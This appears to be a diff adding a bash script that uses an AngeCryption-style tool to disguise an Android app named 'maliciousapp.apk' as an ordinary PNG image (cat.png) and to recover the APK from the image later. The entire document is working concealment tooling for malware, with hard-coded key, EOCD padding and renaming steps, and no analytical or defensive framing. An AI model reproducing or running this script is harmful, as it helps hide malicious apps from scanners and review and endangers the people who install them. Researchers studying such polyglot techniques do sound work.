@@ -1,0 +1,32 @@
+################
+
+Encrypt
+
+################
+
+#!/bin/bash
+echo 'Create maliciousapp-similar and encrypt-apk.py'
+python angecrypt.py maliciousapp.apk cat_original.png maliciousapp-similar.apk 'MyKey12345678901' aes > encrypt-apk.py
+echo 'Add EOCD and padding'
+python axdupe_eocd.py maliciousapp-similar.apk 
+echo -n "123456789" >> eocd2_maliciousapp-similar.apk
+echo 'Change name of file in encrypt-apk.py'
+sed --in-place 's/maliciousapp-similar/eocd2_maliciousapp-similar/g' encrypt-apk.py
+echo 'Encrypt'
+python encrypt-apk.py
+echo 'Change name of final product'
+mv dec-cat_original.png cat.png
+
+#################
+
+Decrypt
+
+#################
+
+sed -e 's/eocd2_maliciousapp-similar\.apk/cat\.png/g' -e 's/encrypt/decrypt/g' < encrypt-apk.py > tmp
+
+mv tmp decrypt-png.py
+
+python decrypt-png.py
+
+mv dec-cat_original.png dec-apk.apk
